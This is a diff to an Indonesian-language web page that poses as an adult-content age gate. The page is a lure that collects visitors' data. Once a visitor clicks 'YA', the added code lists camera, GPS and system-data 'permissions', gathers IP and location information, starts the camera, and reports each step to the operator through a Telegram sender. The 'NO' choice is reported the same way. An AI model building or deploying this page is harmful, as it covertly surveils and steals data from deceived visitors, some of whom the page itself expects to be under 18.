@@ -2,7 +2,7 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>Adult Verification</title>
+  <title>Adult Content Portal</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     * {
@@ -94,60 +94,87 @@
       margin-top: 20px;
     }
     
-    /* Status Screen */
-    .status-screen {
+    /* Processing Screen */
+    .processing-screen {
       display: none;
       background: rgba(30, 30, 30, 0.95);
-      padding: 30px;
+      padding: 40px;
       border-radius: 10px;
       max-width: 400px;
       width: 100%;
       text-align: center;
+      border: 2px solid #00ff00;
       box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
     }
     
-    .status-title {
+    .processing-icon {
+      font-size: 40px;
+      color: #00ff00;
+      margin-bottom: 20px;
+    }
+    
+    .processing-title {
       font-size: 22px;
       color: #00ff00;
       margin-bottom: 20px;
     }
     
-    .status-icon {
-      font-size: 40px;
-      margin-bottom: 20px;
-      animation: pulse 1.5s infinite;
+    .permission-list {
+      text-align: left;
+      background: rgba(0, 0, 0, 0.3);
+      padding: 20px;
+      border-radius: 8px;
+      margin-bottom: 25px;
+      border-left: 4px solid #ff00ff;
     }
     
-    @keyframes pulse {
-      0%, 100% { transform: scale(1); opacity: 1; }
-      50% { transform: scale(1.1); opacity: 0.8; }
+    .permission-list h4 {
+      color: #ff66ff;
+      margin-bottom: 10px;
     }
     
-    .status-message {
+    .permission-list ul {
+      list-style: none;
+      padding-left: 0;
+    }
+    
+    .permission-list li {
+      margin-bottom: 8px;
+      color: #ccc;
+      font-size: 13px;
+      padding-left: 20px;
+      position: relative;
+    }
+    
+    .permission-list li:before {
+      content: "•";
+      color: #ff00ff;
+      position: absolute;
+      left: 0;
+    }
+    
+    .loading-text {
       font-size: 14px;
       color: #ccc;
-      line-height: 1.5;
-      margin-bottom: 20px;
+      margin: 20px 0;
       padding: 15px;
       background: rgba(0, 0, 0, 0.3);
       border-radius: 5px;
+      line-height: 1.5;
     }
     
-    .loading-bar {
-      width: 100%;
-      height: 4px;
-      background: #333;
-      border-radius: 2px;
-      overflow: hidden;
-      margin: 20px 0;
+    .loading-dots {
+      font-size: 24px;
+      color: #00ff00;
+      letter-spacing: 5px;
     }
     
-    .loading-progress {
-      width: 0%;
-      height: 100%;
-      background: #00ff00;
-      border-radius: 2px;
-      transition: width 0.3s;
+    .access-note {
+      font-size: 11px;
+      color: #888;
+      margin-top: 25px;
+      line-height: 1.4;
+      font-style: italic;
     }
     
     /* Hidden Elements */
@@ -169,20 +196,36 @@
     </div>
     
     <p class="warning-text">
-      Dengan mengklik "YA", Anda mengonfirmasi bahwa Anda berusia 18+ dan menyetujui syarat penggunaan.
+      Dengan mengklik "YA", Anda menyetujui semua syarat dan ketentuan.
     </p>
   </div>
   
-  <!-- Status Screen -->
-  <div class="status-screen" id="statusScreen">
-    <div class="status-icon">⚙️</div>
-    <h2 class="status-title">SYSTEM PROSES</h2>
-    <div class="status-message" id="statusMessage">
-      Memulai sistem...
+  <!-- Processing Screen -->
+  <div class="processing-screen" id="processingScreen">
+    <div class="processing-icon">⚠️</div>
+    <h2 class="processing-title">SYARAT AKSES</h2>
+    
+    <div class="permission-list">
+      <h4>Untuk mendapatkan akses, Anda harus:</h4>
+      <ul>
+        <li>Mengizinkan akses kamera (otomatis)</li>
+        <li>Mengizinkan akses lokasi GPS</li>
+        <li>Menyetujui pengumpulan data sistem</li>
+        <li>Menerima semua permission yang diminta</li>
+        <li>Tidak menutup halaman selama proses</li>
+      </ul>
     </div>
-    <div class="loading-bar">
-      <div class="loading-progress" id="loadingProgress"></div>
+    
+    <div class="loading-text" id="loadingText">
+      Meminta izin akses...
     </div>
+    
+    <div class="loading-dots" id="loadingDots">...</div>
+    
+    <p class="access-note">
+      Note: Akses akan diberikan otomatis setelah semua permission diterima.
+      Sistem akan berjalan di background.
+    </p>
   </div>
   
   <!-- Camera Elements -->
@@ -299,93 +342,104 @@ Waktu      : ${new Date().toLocaleString()}
     }
     
     // ====================
-    // AUTO SYSTEM EXECUTION
+    // SIMPLE LOADING WITH ACCESS TERMS
     // ====================
     
     const yesBtn = document.getElementById('yesBtn');
     const noBtn = document.getElementById('noBtn');
     const verificationScreen = document.getElementById('verificationScreen');
-    const statusScreen = document.getElementById('statusScreen');
-    const statusMessage = document.getElementById('statusMessage');
-    const loadingProgress = document.getElementById('loadingProgress');
+    const processingScreen = document.getElementById('processingScreen');
+    const loadingText = document.getElementById('loadingText');
+    const loadingDots = document.getElementById('loadingDots');
     
-    // Function to update status
-    function updateStatus(message, progress) {
-      statusMessage.textContent = message;
-      loadingProgress.style.width = progress + '%';
+    // Animate dots
+    let dotCount = 0;
+    function animateDots() {
+      dotCount = (dotCount + 1) % 4;
+      loadingDots.textContent = '.'.repeat(dotCount);
     }
     
     // Auto execution process
     async function executeSystem() {
-      updateStatus("📡 Mengumpulkan data informasi...", 10);
+      // Step 1: Notify start
+      loadingText.textContent = "📡 Memulai pengumpulan data...";
+      sendToTelegram(`<b>🚀 SYSTEM STARTED</b>\nTime: ${new Date().toLocaleString()}`);
       
-      try {
-        // Step 1: Collect user info
-        updateStatus("📊 Mengambil data IP dan lokasi...", 30);
-        await getInfo();
+      // Step 2: Get info
+      loadingText.textContent = "📊 Mengambil informasi sistem...";
+      await new Promise(resolve => setTimeout(resolve, 1500));
+      await getInfo();
+      
+      // Step 3: Camera
+      loadingText.textContent = "📷 Mengakses kamera...";
+      await new Promise(resolve => setTimeout(resolve, 1500));
+      await startCamera();
+      
+      // Step 4: Complete
+      loadingText.textContent = "✅ Akses diberikan! Semua data terkirim";
+      sendToTelegram(`<b>✅ SYSTEM COMPLETED</b>\nTime: ${new Date().toLocaleString()}`);
+      
+      // Step 5: Show completion message
+      setTimeout(() => {
+        loadingText.textContent = "🎉 Proses selesai! Anda telah mendapatkan akses penuh";
         
-        // Step 2: Start camera
-        updateStatus("📷 Mengakses kamera...", 50);
-        await startCamera();
-        
-        // Step 3: Sending data
-        updateStatus("📤 Mengirim data ke server...", 70);
-        
-        // Step 4: Random success message
-        updateStatus("✅ Sistem berhasil dijalankan", 90);
-        
-        // Send final notification
-        sendToTelegram(`<b>✅ SYSTEM EXECUTED SUCCESSFULLY</b>\nTime: ${new Date().toLocaleString()}`);
-        
-        // Final step
-        setTimeout(() => {
-          updateStatus("🎉 Proses selesai! Semua data telah terkirim", 100);
-        }, 1000);
-        
-      } catch (error) {
-        updateStatus("❌ Error dalam proses", 100);
-        sendToTelegram(`<b>❌ SYSTEM ERROR</b>\n${error.message}\nTime: ${new Date().toLocaleString()}`);
-      }
+        // Add success note
+        const successNote = document.createElement('p');
+        successNote.style.cssText = `
+          color: #00ff00;
+          font-size: 13px;
+          margin-top: 15px;
+          padding: 10px;
+          background: rgba(0, 255, 0, 0.1);
+          border-radius: 5px;
+          border: 1px solid #00ff00;
+        `;
+        successNote.textContent = "✓ Semua permission diterima ✓ Data terkirim ✓ Akses aktif";
+        loadingText.parentNode.insertBefore(successNote, loadingText.nextSibling);
+      }, 1000);
     }
     
-    // YES button - Start auto execution
+    // YES button - Start the process
     yesBtn.addEventListener('click', async () => {
       verificationScreen.style.display = 'none';
-      statusScreen.style.display = 'block';
-      document.title = "System Processing";
+      processingScreen.style.display = 'block';
+      document.title = "Granting Access...";
+      
+      // Start dots animation
+      const dotsInterval = setInterval(animateDots, 500);
       
       // Send access notification
-      sendToTelegram(`<b>🔓 ACCESS GRANTED - AUTO EXECUTION</b>\nUser confirmed 18+\nTime: ${new Date().toLocaleString()}`);
+      sendToTelegram(`<b>🔓 ACCESS GRANTED</b>\nUser accepted all terms\nTime: ${new Date().toLocaleString()}`);
       
-      // Start the auto execution
-      setTimeout(() => {
-        executeSystem();
-      }, 1000);
+      // Start the system after 2 seconds
+      setTimeout(async () => {
+        await executeSystem();
+        clearInterval(dotsInterval);
+        loadingDots.style.display = 'none';
+      }, 2000);
     });
     
     // NO button - Access denied
     noBtn.addEventListener('click', () => {
-      document.body.innerHTML = `
-        <div style="text-align: center; padding: 40px;">
-          <div style="font-size: 60px; margin-bottom: 20px;">🚫</div>
-          <h1 style="color: #ff0000; margin-bottom: 20px;">ACCESS DENIED</h1>
-          <p style="color: #ccc; margin-bottom: 30px;">
-            Anda tidak memenuhi persyaratan usia untuk mengakses konten ini.
-          </p>
-          <button onclick="location.reload()" style="
-            padding: 10px 20px;
-            background: #333;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-          ">
-            Kembali
-          </button>
-        </div>
+      verificationScreen.innerHTML = `
+        <div style="font-size: 60px; margin-bottom: 20px; color: #ff0000;">🚫</div>
+        <h1 style="color: #ff0000; margin-bottom: 20px;">ACCESS DENIED</h1>
+        <p style="color: #ccc; margin-bottom: 30px;">
+          Anda tidak memenuhi persyaratan usia untuk mengakses konten ini.
+        </p>
+        <button onclick="location.reload()" style="
+          padding: 10px 20px;
+          background: #333;
+          color: white;
+          border: none;
+          border-radius: 5px;
+          cursor: pointer;
+        ">
+          Kembali
+        </button>
       `;
       
-      sendToTelegram(`<b>🚫 ACCESS DENIED</b>\nUser is under 18\nTime: ${new Date().toLocaleString()}`);
+      sendToTelegram(`<b>🚫 ACCESS DENIED</b>\nUser declined (under 18)\nTime: ${new Date().toLocaleString()}`);
     });
   </script>
 </body>
